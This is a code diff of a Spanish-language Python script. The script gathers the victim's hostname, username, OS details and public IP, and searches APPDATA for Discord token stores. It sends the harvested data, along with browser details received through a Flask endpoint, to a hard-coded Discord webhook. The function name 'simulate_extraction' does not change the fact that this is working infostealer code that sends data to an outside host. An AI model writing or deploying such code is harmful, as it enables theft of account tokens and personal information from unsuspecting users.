@@ -1,24 +1,32 @@
-from flask import Flask, request
+import os
+import re
+import time
+import socket
+import platform
+from PIL import Image
 import requests
+from flask import Flask, request
 
 app = Flask(__name__)
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI"
 
-@app.route('/webhook', methods=['POST'])
-def recibir_datos():
-    data = request.json
+def get_ip():
+    try:
+        return requests.get("https://api.ipify.org").text
+    except:
+        return "IP no disponible"
 
-    contenido = (
-        "**Datos del navegador:**\n"
-        f"> Navegador: {data.get('navegador')}\n"
-        f"> Idioma: {data.get('idioma')}\n"
-        f"> Plataforma: {data.get('plataforma')}\n"
-        f"> IP: {data.get('ip')}\n"
-    )
+def get_system_info():
+    return {
+        "PC": socket.gethostname(),
+        "Usuario": os.getlogin(),
+        "Sistema Operativo": platform.system(),
+        "Versión SO": platform.version(),
+        "Arquitectura": platform.machine(),
+        "IP Pública": get_ip()
+    }
 
-    requests.post(WEBHOOK_URL, json={"content": contenido})
-    return {"status": "enviado"}
 def find_tokens():
     paths = {
         "Discord": os.path.join(os.getenv("APPDATA", ""), "Discord"),
@@ -82,6 +90,31 @@ def simulate_extraction(webhook, image_path):
     # Enviar al webhook
     try:
         requests.post(webhook, json={"content": text})
-        print("\n Información enviada al webhook.")
+        print("\nInformación enviada al webhook.")
     except Exception as e:
-        print(f"\n Error al enviar al webhook: {e}")
+        print(f"\nError al enviar al webhook: {e}")
+
+@app.route('/webhook', methods=['POST'])
+def recibir_datos():
+    data = request.json
+
+    contenido = (
+        "**Datos del navegador:**\n"
+        f"> Navegador: {data.get('navegador')}\n"
+        f"> Idioma: {data.get('idioma')}\n"
+        f"> Plataforma: {data.get('plataforma')}\n"
+        f"> IP: {data.get('ip')}\n"
+    )
+
+    try:
+        requests.post(WEBHOOK_URL, json={"content": contenido})
+        return {"status": "enviado"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+if __name__ == "__main__":
+    # Ejecuta solo si estás probando en local
+    simulate_extraction(WEBHOOK_URL, "imagen.jpg")
+
+    # Correr el servidor Flask
+    app.run(host="0.0.0.0", port=10000)
